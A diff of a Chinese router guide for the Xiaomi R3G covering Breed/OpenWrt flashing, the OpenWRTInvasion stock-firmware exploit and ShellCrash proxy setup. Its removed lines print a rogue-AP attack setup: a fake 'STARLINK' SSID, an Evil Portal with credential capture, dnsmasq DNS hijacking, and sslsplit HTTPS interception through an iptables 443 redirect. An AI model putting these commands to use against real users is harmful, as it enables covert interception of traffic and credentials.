@@ -1,272 +1,208 @@
-# R3G 路由器完整配置教程
+# R3G 刷机与 ShellCrash 代理部署实操记录
 
-> 适用设备：小米路由器 3G（R3G）
-> 固件：OpenWrt 19.07.2 + Pineapple Cloner
-> 本文整合 U 盘《刷机指南_必读.txt》《ShellCrash部署指南.md》及"问题排障"文件夹内各手册的实操细节，可对照逐步操作。
+> 适用设备：小米路由器 3G（R3G v1，MT7621，UBI 117MB 高配）
+> 固件：OpenWrt 19.07.2（过渡与验证）、23.05.6 / 24.10.4（长期使用）
+> 本文记录本机从原厂固件到代理跑通的具体参数与踩坑结论，每一步给出验证方法与失败判据。
+
+本文与仓库其他文档的分工：
+
+| 文档 | 负责内容 |
+| --- | --- |
+| `README.md` | 选型、路线决策树、固件清单与速查表 |
+| 本文 | 刷机与代理的具体参数、命令原文、失败判据 |
+| `docs/ShellCrash部署指南.md` | 部署 SOP 与疑难定位流程 |
+| `docs/串行级联网关组网与选路实录.md` | 串行级联网关形态的拓扑与选路设计 |
+
+> **部署形态声明（先读这条，否则参数会对不上）**
+>
+> 本文第三章的 ShellCrash 参数取自 R3G 直接承担网关与 WiFi 接入的形态：`firewall_area=1`、启用 TUN、`fake-ip-range` 为 `28.0.0.0/8`。
+>
+> 仓库另有 **iptables / Redir 形态**的实测记录（R3G 关闭无线、作为串行级联网关串在主路由之后）：`firewall_mod=iptables`、`firewall_area=3`、`tun.enable: false`、`fwmark` 生效值 `0x1ed8`、`fake-ip` 段 `198.18.0.1/16`，详见 `docs/串行级联网关组网与选路实录.md` 与 `docs/故障隔离与watchdog设计.md`。
+>
+> 两套形态的分流规则、TUN 开关、DNS 处理均不同，参数不可混用。判别当前设备属于哪一套，SSH 登入后执行：
+>
+> ```sh
+> uci get shellcrash.config.firewall_area
+> grep -E 'tun|fake-ip' /etc/ShellCrash/yamls/config.yaml
+> ```
+>
+> 输出 `firewall_area=3` 且 `enable: false` 即为 iptables / Redir 形态，`firewall_area=1` 且 `enable: true` 即为本文所记录的 TUN 形态。
 
 ---
 
-## 一、背景与硬件
+## 一、硬件与地址规划
 
-| 项目 | 说明 |
-|------|------|
-| 设备 | 小米路由器 3G（R3G） |
-| CPU / 架构 | MT7621，mipsel 24kc（注意：必须用 softfloat 版代理内核） |
-| 存储 | UBI 117MB（高配版，可直接刷 19.07.2 + Cloner） |
-| 固件 | OpenWrt 19.07.2 + Pineapple Cloner |
-| WAN 管理 IP | 192.168.1.54（SSH 22，由上级交换机 DHCP 分配） |
-| LAN 管理 IP | 172.16.42.1（Pineapple 面板 http://172.16.42.1:1471） |
-| SSH 工具（电脑侧） | plink76.exe / pscp76.exe，密码 YOUR_ROOT_PASSWORD |
+| 项目 | 值 |
+| --- | --- |
+| 设备 | 小米路由器 3G（R3G v1） |
+| CPU | MT7621，mipsel 24kc，softfloat |
+| 存储 | UBI 117MB（高配版） |
+| WAN | 192.168.1.54，由上级交换机 DHCP 分配 |
+| 上级网段 | 192.168.1.0/22 |
+| SSH | 22/tcp，root，密码见个人凭据，仓库内一律写作 `YOUR_ROOT_PASSWORD` |
+| 代理 API | 127.0.0.1:9999 |
+| Breed 引导 | `breed-mt7621-xiaomi-r3g.bin` |
 
-电脑侧 SSH 连接：
+电脑侧工具为 PuTTY 套件的 `plink76.exe` 与 `pscp76.exe`：
 
 ```sh
 plink76.exe -ssh -batch -pw YOUR_ROOT_PASSWORD root@192.168.1.54
-pscp76.exe -pw YOUR_ROOT_PASSWORD 本地文件 root@192.168.1.54:/tmp/
+pscp76.exe -pw YOUR_ROOT_PASSWORD <本地文件> root@192.168.1.54:/tmp/
 ```
+
+### 1.1 架构判定（决定代理内核选型）
+
+MT7621 是 softfloat 平台。代理内核若取成 hardfloat 版本，运行时报 `Illegal instruction`。刷机后先确认架构：
+
+```sh
+uname -m
+opkg print-architecture
+```
+
+预期输出：`uname -m` 返回 `mips`，`opkg print-architecture` 列表中含 `mipsel_24kc`。
+失败判据：`uname -m` 返回 `mips64` 说明刷错固件型号，需回到刷机流程重刷。
 
 ---
 
 ## 二、刷机流程
 
-### 2.1 OpenWRTInvasion 漏洞开启 SSH/Telnet（原厂固件阶段）
+### 2.1 OpenWRTInvasion 开启 SSH/Telnet（仅原厂固件阶段）
 
-1. 确认 R3G 为**原厂固件**且固件版本与漏洞利用工具匹配（OpenWRTInvasion 针对小米原厂固件 R3G 的 stok 漏洞）。
-2. 电脑与路由器连接（R3G 原厂 LAN 口），浏览器登录原厂管理页，从 URL 中获取 `stok` 令牌。
-3. 运行 OpenWRTInvasion 工具（Python 3），按提示输入路由器 IP 与 stok。
-4. 利用成功后，路由器自动开启 Telnet/SSH，可登录获取 root shell。
-5. 利用前确认路由器当前为原厂系统；若已经刷过其他固件，漏洞不再适用。
+适用于尚未刷入第三方固件的原厂系统，利用原厂 Web 的 `stok` 校验漏洞执行命令并拉起 Telnet/SSH。
 
-> 说明：本机刷机历史上使用 U 盘 + Reset 盲刷 Breed 的方式（见 2.2），OpenWRTInvasion 用于原厂系统下开启 SSH 通道，两者可互为备选。
+1. 电脑用网线接 R3G 原厂 LAN 口，登录原厂管理页。
+2. 从浏览器地址栏取 `stok` 值（`http://192.168.1.1/cgi-bin/luci/;stok=<此串>/web/home`）。
+3. 运行 OpenWRTInvasion（Python 3），按提示填入路由器 IP 与 `stok`。
+4. 工具执行成功后，`telnet 192.168.1.1` 或 `ssh root@192.168.1.1` 可进入 root shell。
 
-### 2.2 刷入 Breed 不死引导（U 盘盲刷方式）
+验证：
 
-1. 拔掉路由器电源。
-2. 将 U 盘（含刷机包）插到路由器背面 USB 口。
-3. 牙签/取卡针按住背面 Reset 小孔不松手。
-4. 插上电源（Reset 继续按住）。
-5. 盯指示灯：黄灯常亮 → 变成**黄灯快速闪烁** → 松手。
-   - 若 30 秒还不闪，拔电源重试，确认 U 盘插紧。
-6. 等待约 2-3 分钟，指示灯最终变蓝灯或熄灭。
-7. 拔电源、拔 U 盘，Breed 刷入完成。
+```sh
+telnet 192.168.1.1
+```
 
-### 2.3 进入 Breed 刷机界面
+预期：出现 `root@XiaoQiang:~#` 提示符（部分版本为空密码，直接回车）。
+失败判据：工具报 `stok` 无效或 401，说明原厂固件版本与该漏洞不匹配；路由器若已非原厂系统，此步骤不适用，直接走 2.2。
 
-1. 网线连接电脑与路由器 **LAN 口（灰色口）**，不是蓝色 WAN 口。
-2. 电脑设置静态 IP：
-   - IP 地址：192.168.1.10
-   - 子网掩码：255.255.255.0
-   - 网关：192.168.1.1
-   - DNS：192.168.1.1
-3. 按住 Reset 插电，5 秒后松手。
-4. 浏览器打开 http://192.168.1.1，看到黑底黄字 Breed 界面即成功。
+### 2.2 U 盘盲刷 Breed
 
-### 2.4 刷入 OpenWrt 19.07.2 + Cloner
+本机主刷路径。R3G 的 Breed 可通过 U 盘加 Reset 键触发，无需已有 shell。
 
-在 Breed 界面操作：
+1. U 盘格式化为 **FAT32**，把 `breed-mt7621-xiaomi-r3g.bin` 放在根目录。
+2. 路由器断电。
+3. U 盘插入路由器 USB 口。
+4. 按住 Reset 键不放，插电。
+5. 观察指示灯，**黄灯快速闪烁**后松开 Reset。
 
-1. **设置环境变量（必须，否则重启可能回原厂）**
-   - 左侧「环境变量编辑」→ 新增：
-     - 名称：`xiaomi.r3g.bootfw`
-     - 值：`2`
-   - 点击添加 → 保存。
-2. **刷过渡固件**
-   - 「固件更新」→ 固件类型选「小米路由器3G 固件2」
-   - 选择 `openwrt-r3g-initramfs.bin` → 上传 → 更新 → 等待重启（约 2 分钟）。
-3. **刷正式固件**
-   - 打开 http://192.168.1.1，登录（root / 空密码）。
-   - System → Backup / Flash Firmware → 选择 `openwrt-r3g-sysupgrade.bin` → Flash image → 确认。
-   - 建议**不保留配置**，等待自动重启（约 3 分钟）。
+验证：指示灯由常亮转为快速闪烁即表示已进入 Breed 并完成刷写。
+失败判据：
+- 通电 30 秒后指示灯仍常亮不闪：U 盘未插紧、U 盘为 exFAT/NTFS 而非 FAT32、或文件不在根目录。
+- 闪烁后无法进入 Breed Web：断电重来一次；仍失败则用 2.1 的 shell 路径写入。
 
-> 备选：Breed Web 直接刷 sysupgrade 可能报"数据无效"，此时走 initramfs 过渡再刷正式包（如上流程）。
+### 2.3 进入 Breed Web
 
-### 2.5 获取 Pineapple 面板
+1. 电脑网卡设静态地址：IP `192.168.1.10`，掩码 `255.255.255.0`，网关 `192.168.1.1`。
+2. 网线接路由器 **LAN 口**（灰色口），不要接 WAN 口（蓝色口）。
+3. 浏览器访问 `http://192.168.1.1`。
 
-- 刷好后 WAN 口接上级交换机，自动获取 IP（本机为 192.168.1.54）。
-- LAN 管理地址 172.16.42.1，浏览器打开 **http://172.16.42.1:1471** 进入 Pineapple 面板。
-- SSH 默认 root，密码本机为 YOUR_ROOT_PASSWORD。
+验证：出现黑底黄字的 Breed 配置界面，界面顶部显示 Breed 版本与设备型号。
+失败判据：页面打不开时，先 `ping 192.168.1.1` 确认静态地址生效；能 ping 通但页面不出，换浏览器禁用缓存或改用无痕窗口。
+
+### 2.4 刷入 OpenWrt
+
+固件文件名在 19.07.2 与 23.05.6 之间有过变更，注意区分：
+
+| 版本 | initramfs | sysupgrade |
+| --- | --- | --- |
+| 19.07.2 | `openwrt-19.07.2-ramips-mt7621-xiaomi_mir3g-initramfs-kernel.bin` | `openwrt-19.07.2-ramips-mt7621-xiaomi_mir3g-squashfs-sysupgrade.bin` |
+| 23.05.6 | `openwrt-23.05.6-ramips-mt7621-xiaomi_mi-router-3g-initramfs-kernel.bin` | `openwrt-23.05.6-ramips-mt7621-xiaomi_mi-router-3g-squashfs-sysupgrade.bin` |
+| 24.10.4 | 无（直接 sysupgrade） | `openwrt-24.10.4-ramips-mt7621-xiaomi_mi-router-3g-squashfs-sysupgrade.bin` |
+
+刷机前先校验固件完整性，`SHA256SUMS` 在 `engineering/firmware/` 目录下：
+
+```sh
+# Linux / macOS
+cd engineering/firmware && sha256sum -c SHA256SUMS
+```
+
+```powershell
+# Windows PowerShell
+Get-FileHash .\openwrt-23.05.6-ramips-mt7621-xiaomi_mi-router-3g-squashfs-sysupgrade.bin -Algorithm SHA256
+```
+
+预期：`sha256sum -c` 逐行输出 `OK`；PowerShell 输出的 Hash 值与 `SHA256SUMS` 中同一文件名后的值逐字符一致。
+失败判据：出现 `FAILED` 或哈希不一致，说明文件下载损坏或被中间层篡改，重新下载，不要刷入。
+
+刷入步骤：
+
+1. Breed 界面进入「环境变量」，新增 `xiaomi.r3g.bootfw` = `2`。缺这一项，重启会回退原厂固件。
+2. 「固件更新」选择 initramfs 文件上传，约 2 分钟。initramfs 运行在内存中，重启即丢，用于验证固件能否启动。
+3. initramfs 启动后，在 LuCI 或 SSH 中上传 sysupgrade 文件，**不保留配置**刷入，约 3 分钟。
+
+验证：
+
+```sh
+cat /proc/mtd
+```
+
+预期：能看到 `mtd0: ... "u-boot"`、`mtd1: ... " u-boot-env"`、以及容量约 117MB 的 `ubi` 分区。
+失败判据：
+- Breed 提示「数据无效」或拒绝上传：直接刷 sysupgrade 包会被拒，改走 initramfs 过渡。
+- 刷完后反复重启回原厂：`xiaomi.r3g.bootfw` 未设为 2，回 Breed 重新设置。
+- initramfs 能启动但 sysupgrade 后起不来：分区大小与固件不符（低配版 UBI 小于 117MB），换对应版本固件。
 
 ---
 
-## 三、假 AP 部署（原生 hostapd）
+## 三、ShellCrash 代理部署
 
-### 3.1 清理残留管理 AP（Pineapple_D853）
+### 3.1 离线安装
 
-Pineapple 固件默认 wlan0/wlan0-1 为管理 AP（SSID Pineapple_D853）。若只用假 AP，将管理 AP 关闭：
+R3G 上直接跑在线安装脚本容易失败，本机采用电脑侧准备、pscp 上传的方式。
+
+1. **内核选 softfloat**：`mihomo-mipsle-softfloat`，文件名形如 `mihomo-mipsle-soft.gz`。hardfloat 版本会 `Illegal instruction`。
+2. **gz 在电脑侧压好**：R3G 上执行 gzip 会超时，且 `/tmp` 空间不足。电脑上压缩完成后用 pscp 上传为 `CrashCore.gz`。
+3. ShellCrash 版本 1.9.4，安装目录是 `/etc/ShellCrash`（注意不是 `/etc/ShellClash`）。安装时把 `TMPDIR` 指到 Flash，避免 `/tmp` 写满。
 
 ```sh
-uci set wireless.@wifi-iface[N].disabled='1'   # N 为管理 AP 所在 wifi-iface 序号
-uci commit wireless
-wifi reload
+# 电脑侧上传
+pscp76.exe -pw YOUR_ROOT_PASSWORD CrashCore.gz root@192.168.1.54:/tmp/
 ```
 
-> 注意：`network` 字段属于 `config wifi-iface`（接口层），写在 `radio` 设备层会被忽略，接口会挂回 br-lan。
-
-### 3.2 建 5G 假 AP（radio1/wlan1）
-
-在无线配置中新增（或编辑）wifi-iface：
-
 ```sh
-uci set wireless.@wifi-iface[?].device='radio1'
-uci set wireless.@wifi-iface[?].ifname='wlan1'
-uci set wireless.@wifi-iface[?].ssid='MarvisAP'          # 或 STARLINK 星链通讯
-uci set wireless.@wifi-iface[?].encryption='psk2+ccmp'
-uci set wireless.@wifi-iface[?].key='YOUR_WIFI_PASS'
-uci set wireless.@wifi-iface[?].mode='ap'
-uci set wireless.@wifi-iface[?].network='lan_fake'       # 独立接口，勿用 br-lan
-uci commit wireless
-wifi reload && wifi up radio1
-```
-
-要点：
-- SSID 含中文时最大 **32 字节**（UTF-8 中文每字 3 字节），SSH 传中文易乱码，须用脚本上传或十六进制转义。
-- 改完 `wifi reload` 后检查 hostapd：phy1 可能不随 reload 自动启动，需 `wifi up radio1`。
-
-### 3.3 独立网段与 dnsmasq DHCP
-
-**假 AP 网段必须与上级完全隔离**（如 10.66.0.0/24）。误用与上级 WAN 重叠网段会导致 DHCP 池包含 R3G 自身 WAN IP、ARP 失败。
-
-持久化 DHCP 配置写 `/etc/dnsmasq.conf`（conf-file 被主配置引用，重启保留），**不要写 /tmp**：
-
-```sh
-cat > /etc/dnsmasq.conf << 'EOF'
-# MarvisAP 假 AP DHCP 配置
-dhcp-range=10.66.0.100,10.66.0.239,255.255.255.0,12h
-dhcp-option=3,10.66.0.1
-dhcp-option=6,10.66.0.1
-log-dhcp
-EOF
-/etc/init.d/dnsmasq restart
-```
-
-坑：
-- UCI dnsmasq 生成 DHCP 依赖接口 up；独立 up 状态的接口能正常产出 dhcp-range，lan 桥接口可能生成失败（固件 bug）。
-- 若日志缺 "DHCP, IP range" 行、67 端口无监听，说明 dnsmasq 未加载 DHCP 配置，直接按上面写 `/etc/dnsmasq.conf` 修复。
-
-### 3.4 MASQUERADE NAT
-
-```sh
-# 允许假 AP 网段
-iptables -t nat -A POSTROUTING -s 10.66.0.0/24 -o eth0.2 -j MASQUERADE
-iptables -A FORWARD -i wlan1 -o eth0.2 -j ACCEPT
-iptables -A FORWARD -i eth0.2 -o wlan1 -m state --state RELATED,ESTABLISHED -j ACCEPT
-```
-
-坑：开启/关闭假 AP 后会残留 10.66 网段 ACCEPT/MASQUERADE 规则，清理时**必须带 `-i wlan1` 精确匹配**，否则删不掉或误删。
-
----
-
-## 四、EvilPortal 门户
-
-### 4.1 密钥认证门户（MyPortal.php）
-
-Evil Portal 为 Pineapple 模块（模块市场目录 `/sd/modules/`）。门户页面通常由 PHP 编写：
-
-1. 在 `/sd/modules/EvilPortal/` 下放置门户文件（如 `MyPortal.php`），页面内做**密钥认证**：提交的密钥正确才放行（跳转目标页），错误则提示重试。
-2. 门户提交动作将输入记录到 `capture.php` 或日志文件，供后续提取。
-
-### 4.2 nginx charset utf-8 与 Content-Type 乱码修复
-
-门户中文乱码的修复点：
-
-```sh
-# nginx 站点配置内添加
-charset utf-8;
-# 且确保响应头 Content-Type 为
-# Content-Type: text/html; charset=utf-8
-```
-
-修改后重载 nginx（`/etc/init.d/nginx restart` 或 `nginx -s reload`），再打开门户页验证中文正常。
-
-### 4.3 captiveportal 启用
-
-启用 captiveportal（强制门户）后，连接假 AP 的设备访问任意网址都会被重定向到门户页，从而强制完成密钥认证/采集流程。在 Pineapple 面板 Modules → Captive Portal 中启用，并指定门户文件（如 MyPortal）。
-
----
-
-## 五、采集方案
-
-### 5.1 DNS 域名劫持（dnsmasq address=/）
-
-DNSspoof 模块不可用（依赖 dnsspoof 未装，且 dnsmasq 已监听假 AP 网段 53 端口冲突）时，用 dnsmasq 等价劫持：
-
-```sh
-# /etc/dnsmasq.conf 追加（每行劫持一个域名）
-address=/example.com/10.66.0.1
-/etc/init.d/dnsmasq restart
-```
-
-同时启用 DNS 查询日志：
-
-```sh
-# /etc/dnsmasq.conf 追加
-log-queries
-log-facility=/tmp/dnsmasq_dns.log
-/etc/init.d/dnsmasq restart
-```
-
-### 5.2 capture.php（门户凭证采集）
-
-在门户目录放置 `capture.php`，接收门户页 POST 的密钥/账号输入并落盘（如写入 `/sd/modules/EvilPortal/captures/` 下按时间戳命名的文件）。采集文件应设置可写权限。
-
-### 5.3 sslsplit MITM（监听 10443 + 443 REDIRECT）
-
-前提：安装 sslsplit（opkg 源超时时可从电脑侧下载 ipk 后 pscp 上传本地安装）。
-
-```sh
-# 1. 443 → 10443 REDIRECT（必须带 -i wlan1，只劫持假 AP 方向）
-iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 443 -j REDIRECT --to-ports 10443
-
-# 2. 启动 sslsplit（用双括号子 shell 后台拉起，避免 SSH 会话挂起）
-(sslsplit -D -l /tmp/sslsplit_connect.log -k /tmp/cert/key.pem -c /tmp/cert/cert.pem \
-  -S /tmp/ssl_dec -Z 10443 https 0.0.0.0 10443 &)
+# 路由器侧，按 ShellCrash 安装流程放置内核后重启服务
+/etc/init.d/shellcrash restart
 ```
 
 验证：
 
 ```sh
-netstat -tlnp | grep 10443        # 确认监听
-ls /tmp/ssl_dec                   # 解密输出目录；无 HTTPS 流量时为空是正常的
+ls -l /etc/init.d/shellcrash
+pidof CrashCore
 ```
 
-坑：`/etc/init.d/sslsplit start` 在 SSH 会话中会挂起，必须用 `(sslsplit ... &)` 拉起；REDIRECT 规则不带 `-i wlan1` 会应用到所有入接口，与透明代理冲突。
+预期：`/etc/init.d/shellcrash` 存在且可执行，`pidof` 返回一个进程号。
+失败判据：
+- `ls` 报不存在：启动脚本名是全小写 `shellcrash`，`ShellCrash` 这个路径不存在。
+- `pidof CrashCore` 无输出：内核文件未放到正确位置（`/etc/ShellCrash/CrashCore`），或架构不匹配，查看 `/etc/ShellCrash/.start_error`。
 
-### 5.4 SNI 画像
+### 3.2 配置持久化
 
-- 通过 sslsplit 解密连接日志（`/tmp/sslsplit_connect.log`）或 tcpdump 抓包提取 TLS ClientHello 中的 **SNI**（服务器名称），即可获得目标设备的 HTTPS 访问画像。
-- 与 DNS 日志（`log-queries`）交叉比对，可还原"域名级访问行为"。
-
----
-
-## 六、ShellClash 代理
-
-### 6.1 离线安装（R3G 专用）
-
-1. **架构必须匹配**：MT7621 是 mipsel 24kc，**hardfloat 内核会 Illegal instruction**，必须用 softfloat 版（mihomo-mipsle-softfloat / `mihomo-mipsle-soft.gz`）。
-2. **gzip 压缩极慢**：在 R3G 上 gzip 压缩内核会超时且 /tmp 空间不足。正确做法：电脑侧压缩好 gz，pscp 上传为 `CrashCore.gz`。
-3. 安装 ShellCrash（1.9.4）到 `/etc/ShellCrash`（注意：不是 /etc/ShellClash），TMPDIR 改到 Flash 避免 /tmp 满。
+修改必须写 `/etc/ShellCrash/yamls/config.yaml`，这是 `core_config` 的来源。只改 `/tmp/ShellCrash/config.yaml` 会被启动脚本 `clash_modify.sh` 覆盖。`bfstart.sh` 检测到 `yamls/config.yaml` 存在时，会跳过订阅下载直接使用该文件。
 
 ```sh
-# 电脑侧
-pscp76.exe -pw YOUR_ROOT_PASSWORD CrashCore.gz root@192.168.1.54:/tmp/
-# 路由器侧按 ShellCrash 安装流程放置后
-/etc/init.d/shellcrash restart
-```
-
-> 启动脚本名是全小写 `shellcrash`，`ShellCrash` 不存在。
-
-### 6.2 配置持久化与关键参数
-
-修改必须写 `/etc/ShellCrash/yamls/config.yaml`（core_config 源）；只改 `/tmp/ShellCrash/config.yaml` 会被启动脚本 clash_modify.sh 覆盖。bfstart.sh 检测到 `yamls/config.yaml` 存在会跳过订阅下载直接使用。
-
-```sh
-# configs/ShellCrash.cfg 必须设置（否则 fw_start.sh 变量空报错，透明代理规则不加载）
-# firewall_area=1   （1=本机+局域网，推荐）
-# ipv6_redir=OFF
 vi /etc/ShellCrash/configs/ShellCrash.cfg
 ```
 
-DNS 段必须指向真实公共 DNS，禁止 127.0.0.1 自引用死循环：
+该文件至少写入两项，缺失会导致 `fw_start.sh` 变量为空报错、透明代理规则不加载：
+
+```
+firewall_area=1
+ipv6_redir=OFF
+```
+
+`firewall_area=1` 表示本机加局域网，为本机推荐值。
+
+DNS 段必须指向真实公共 DNS。填 `127.0.0.1` 会形成自引用死循环：
 
 ```yaml
 dns:
@@ -282,52 +218,94 @@ dns:
   fake-ip-range: 28.0.0.0/8
 ```
 
-### 6.3 订阅导入（在线 403 的兜底方案）
+验证：
 
-在线订阅拉取常见失败（your-subscription.example.com 返回 520/522、HTTP 403 token is error、curl 模拟 Clash Verge UA 仍 403）。兜底：
+```sh
+nft list table inet shellcrash | grep -c chain
+```
 
-1. 本机（有代理环境）Clash Verge profiles 目录提取已下载的 YAML。
-2. 过滤占位假节点（`server` 为 `'1'`/`'11'`、`port` 为 1/11 的公告/教程节点）。
-3. 合并骨架，写入 `yamls/config.yaml`，pscp 上传。
+预期：输出大于 0 的整数，表示规则已加载。
+失败判据：命令报 `No such file or directory` 或计数为 0，检查 `firewall_area` 与 `ipv6_redir` 是否都在 `ShellCrash.cfg` 中，补齐后执行 `sh /etc/ShellCrash/starts/fw_start.sh` 手动加载一次。
+
+### 3.3 订阅导入（在线拉取失败的兜底）
+
+在线订阅常见失败形式：服务端返回 520/522、`HTTP 403 token is error`、即使 curl 模拟 Clash Verge 的 UA 仍返回 403。兜底流程：
+
+1. 在已有代理的电脑上，从 Clash Verge 的 profiles 目录取出已下载的 YAML。
+2. 过滤占位节点：`server` 为 `'1'` 或 `'11'`、`port` 为 1 或 11 的公告/教程条目，这类节点会污染 `url-test` 分组。
+3. 合并配置骨架，写入 `yamls/config.yaml` 后上传。
 
 ```sh
 pscp76.exe -pw YOUR_ROOT_PASSWORD config.yaml root@192.168.1.54:/etc/ShellCrash/yamls/config.yaml
+```
+
+```sh
 kill $(pidof CrashCore)
 /etc/init.d/shellcrash restart
 ```
 
-YAML 生成坑：节点压成单行会导致 CrashCore `-t` 校验失败、ShellCrash 回退基础配置；用 `default_flow_style=True` 流式格式可过校验。
+YAML 生成注意：节点压成单行会导致 CrashCore 的 `-t` 校验失败，ShellCrash 随即回退到基础配置。用 `default_flow_style=True` 生成流式格式可以通过校验。
 
-### 6.4 API 切节点（PUT /proxies）
-
-mihomo REST API：`PUT /proxies/组名`，body `{"name":"节点名"}`。
-
-R3G 上无 curl/base64 时，中文 body 用 **printf 十六进制转义** 经 wget `--body-file` 发送：
+验证：
 
 ```sh
-# 例：切到"日本1"（UTF-8 十六进制 \xe6\x97\xa5\xe6\x9c\xac1）
+wget -q -O - http://127.0.0.1:9999/proxies | head -c 300
+```
+
+预期：返回 JSON，`proxies` 字段中含订阅里的节点名。
+失败判据：返回 `{}` 或只有 `DIRECT`/`REJECT`，说明 `yamls/config.yaml` 未生效，确认文件路径与 YAML 是否通过 `-t` 校验。
+
+### 3.4 API 切节点
+
+mihomo REST API 用 `PUT /proxies/<组名>`，body 为 `{"name":"<节点名>"}`。
+
+R3G 上没有 curl 和 base64，中文 body 用 printf 十六进制转义写入文件，再用 wget 的 `--body-file` 发送：
+
+```sh
+# 切到「日本1」，UTF-8 十六进制为 \xe6\x97\xa5\xe6\x9c\xac1
 printf '{"name":"\xe6\x97\xa5\xe6\x9c\xac1"}' > /tmp/body.json
 wget -qO- --header='Content-Type: application/json' --body-file=/tmp/body.json \
   -X PUT http://127.0.0.1:9999/proxies/%E8%87%AA%E5%8A%A8%E9%80%89%E6%8B%A9
+```
 
-# 节点延迟测试（URL 中的中文需 percent-encode）
+```sh
+# 节点延迟测试，URL 中的中文需 percent-encode
 wget -qO- 'http://127.0.0.1:9999/proxies/%E6%97%A5%E6%9C%AC1/delay?timeout=3000&url=http://www.gstatic.com/generate_204'
 ```
 
-> 注意：API 实时切换不写配置文件，重启 ShellClash 后回到默认选择组；需固定节点须改 `yamls/config.yaml`。
+验证：切节点返回空 body（HTTP 204）；延迟测试返回 `{"delay":<毫秒数>}`。
+失败判据：返回 `400` 说明节点名与实际不一致，用 3.3 结尾的 `proxies` 接口确认准确名称。
 
-### 6.5 TUN 模式切换（全局接管）
+API 实时切换不写配置文件，重启 ShellCrash 后回到配置里的默认选择组。要固定节点，改 `yamls/config.yaml` 中对应 `proxy-groups` 的 `proxies` 顺序。
+
+### 3.5 TUN 模式切换
+
+R3G 原厂内核没有 tun 模块，需先安装：
 
 ```sh
-# 1. 安装内核 TUN 模块（R3G 原内核无 tun）
-#    opkg update 慢/超时，可从阿里云镜像手动 wget kmod-tun (4.14.171-1) 后：
+# opkg update 慢或超时，可从阿里云镜像手动下载 kmod-tun 后本地安装
 opkg install /tmp/kmod-tun_*.ipk
-modprobe tun            # 确认 /dev/net/tun 就绪
+modprobe tun
+```
 
-# 2. 切换为 TUN 模式（持久化）
-#    在 /etc/ShellCrash/configs/ShellCrash.cfg 写入：
-#    redir_mod=Tun模式
-# 3. 重启
+验证：
+
+```sh
+ls -l /dev/net/tun
+```
+
+预期：设备节点存在。
+失败判据：`No such file or directory` 说明 kmod-tun 版本与内核不符（19.07.2 对应 4.14.171-1），装错版本不会创建节点。
+
+切换为 TUN 模式，在 `/etc/ShellCrash/configs/ShellCrash.cfg` 写入：
+
+```
+redir_mod=Tun模式
+```
+
+重启服务：
+
+```sh
 /etc/init.d/shellcrash restart
 ```
 
@@ -342,102 +320,96 @@ tun:
   auto-detect-interface: false
 ```
 
-路由由 ShellCrash 防火墙脚本管理：fw_start.sh 等待 utun 出现，`ip route add default dev utun table 100` + `ip rule fwmark 7894`；mihomo 自身 auto-route 为 false。
+路由由 ShellCrash 防火墙脚本管理：`fw_start.sh` 等待 utun 出现后执行 `ip route add default dev utun table 100`，配合 `ip rule fwmark 7894` 分流。mihomo 自身的 `auto-route` 保持 false。
 
 验证：
 
 ```sh
-ip route show table all | grep utun     # utun 策略路由
-netstat -tlnp | grep -E '7890|9999'     # 7890=tun, 9999=API
-wget -qO- https://www.gstatic.com/generate_204   # 出海 0
-wget -qO- https://www.baidu.com                  # 国内 0
+ip route show table all | grep utun
+netstat -tlnp | grep -E '7890|9999'
+wget -qO- https://www.gstatic.com/generate_204
+wget -qO- https://www.baidu.com
 ```
 
-TUN 注意事项：
-- IPv6 受限：内核缺 ip6table_nat，重启时 ip6tables nat 报 "Table does not exist"；IPv4 不受影响，可装 kmod-ipt-nat6 修复。
-- TUN 模式 CPU 占用高于 Redir 模式，R3G 性能有限，日常代理可切回 Redir 模式省资源。
+预期：第一条输出含 `default dev utun table 100`；第二条显示 7890（tun）与 9999（API）在监听；两条 wget 均返回 0 字节。
+失败判据：`ip route` 无 utun 输出说明 fw_start.sh 超时未建表，等待 15 秒后重查；仍无则手动执行 `sh /etc/ShellCrash/starts/fw_start.sh`。
+
+TUN 模式的两点限制：
+
+- IPv6 受限：内核缺 `ip6table_nat`，重启时 ip6tables nat 报 `Table does not exist`。IPv4 不受影响，需要 IPv6 时补装 `kmod-ipt-nat6`。
+- CPU 占用高于 Redir 模式。R3G 性能有限，日常代理建议切回 Redir 模式。
 
 ---
 
-## 七、互斥切换（mode_switch.sh）
+## 四、网络与无线规划
 
-ShellClash 透明代理（劫持 53/80/443）与 sslsplit 443 REDIRECT 会冲突，用互斥切换脚本：
+本文记录的是无线启用形态，用于终端直接连 R3G 上网。当前设备已转为关闭无线的串行级联网关形态，两套形态的配置不可混用，判别与拓扑见 `docs/串行级联网关组网与选路实录.md`。
 
-```sh
-/usr/bin/mode_switch.sh pine|clash|status
-```
+无线启用形态的约定：
 
-| 参数 | 行为 |
-|------|------|
-| `pine` | 渗透模式：先停 ShellCrash，再启动 sslsplit/门户等渗透服务 |
-| `clash` | 代理模式：停止渗透服务（sslsplit），启动 ShellCrash 透明代理 |
-| `status` | 查看当前模式状态 |
+1. 上网 WiFi 走 radio1（5G，ch153）。
+2. radio0（2.4G）与管理用途的 `wlan0`、`wlan0-1` 接口保持 `disabled='1'`。
+3. 上级交换机网段 192.168.1.0/22，不改 WAN IP，WAN 保持 192.168.1.54 DHCP 自动获取。
 
-原理：同一时刻只保留一套"流量接管"体系，避免 443 劫持打架、iptables/nftables 规则互相残留。
-
----
-
-## 八、WiFi 与网络规划
-
-当前网络拓扑红线（**用户红线，务必遵守**）：
-
-1. **唯一上网 WiFi = STARLINK 星链通讯**（radio1 5G，ch153），保持可用。
-2. **管理 WiFi 已关闭**：wlan0/wlan0-1（Pineapple_D853 等）已 `disabled='1'`，不要重新启用。
-3. **上级交换机网段 192.168.1.0/22**：不杀主网络、**不改 WAN IP**（WAN 保持 192.168.1.54 DHCP 自动获取）。
-4. 假 AP 使用独立网段 10.66.0.0/24，与上级 192.168.1.0/22 完全隔离。
-
-管理入口汇总：
+管理入口：
 
 | 用途 | 地址 |
-|------|------|
+| --- | --- |
 | OpenWrt LuCI / SSH | 192.168.1.54（WAN） |
-| Pineapple 面板 | http://172.16.42.1:1471（LAN） |
 | ShellCrash API | 127.0.0.1:9999 |
+
+验证无线状态：
+
+```sh
+wifi status
+uci show wireless | grep -E 'disabled|ssid|channel'
+```
+
+预期：`wifi status` 返回 JSON，`up: true` 的接口只有 radio1 对应项；`disabled` 属性对 wlan0 系列为 `1`。
+失败判据：radio0 状态为 up 说明有终端在走 2.4G，与规划不符。
 
 ---
 
